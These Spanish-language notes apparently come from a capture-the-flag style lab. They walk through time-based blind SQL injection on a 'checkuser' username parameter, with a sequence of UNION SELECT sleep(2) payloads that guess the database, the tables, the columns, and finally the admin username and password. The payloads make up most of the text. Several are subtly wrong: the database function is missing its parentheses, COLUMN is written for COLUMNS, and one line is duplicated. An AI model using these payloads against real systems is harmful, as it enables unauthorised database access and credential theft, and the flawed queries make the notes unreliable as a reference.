# Blind SQLi - Time Based
## Proceso
1. obtener base de datos (schema)
2. obtener nombres de tablas
3. obtener columnas
4. explotar

## URI explotable

https://website.thm/checkuser?username=admin

## obtener base de datos (schema)

```
admin' UNION SELECT sleep(2);-- se ejecuta automaticamente
admin' UNION SELECT sleep(2),2;-- se demora 2 segundos
admin' UNION SELECT sleep(2),2 WHERE database LIKE '%'; --
admin' UNION SELECT sleep(2),2 WHERE database LIKE 'a%'; --
admin' UNION SELECT sleep(2),2 WHERE database LIKE 'b%'; --
admin' UNION SELECT sleep(2),2 WHERE database LIKE 'c%'; --

y seguir 

admin' UNION SELECT sleep(2),2 WHERE database LIKE 'ca%'; --
admin' UNION SELECT sleep(2),2 WHERE database LIKE 'cb%'; --
admin' UNION SELECT sleep(2),2 WHERE database LIKE 'cc%'; --
admin' UNION SELECT sleep(2),2 WHERE database LIKE 'cc%'; --
```
Eventualmente encontraremos las tablas, para este caso: **sqli_4**

## obtener tablas

nos aprovecharemos de la info de metadata que almacena el motor.

admin' UNION SELECT sleep(2),2 FROM information_schema.tables WHERE table_schema = 'sqli_4' AND table_name LIKE 'ca%'; --

Mismo ejercicio para obtener base de datos

Obtendremos de este ejercicio la tabla: **users**

## obtener campos

admin' UNION SELECT sleep(2),2 FROM information_schema.COLUMN WHERE TABLE_SCHEMA = 'sqli_4' AND TABLE_NAME = 'users' and COLUMN_NAME LIKE 'ca%'; --

obtendremos los campos: **username** y **password**

## explotar

Para explotar debemos averiguar usuarios y contraseñas.

### averiguar usuario

admin' UNION SELECT sleep(2),2 FROM users WHERE username LIKE 'a%'; -- se obtendra de este ejercicio **admin**

## obtener password

admin' UNION SELECT sleep(2),2 FROM users WHERE username = 'admin' AND password LIKE '1%'; -- se obtendra de este ejercicio **23433**

---
Happy exploiting - Zpx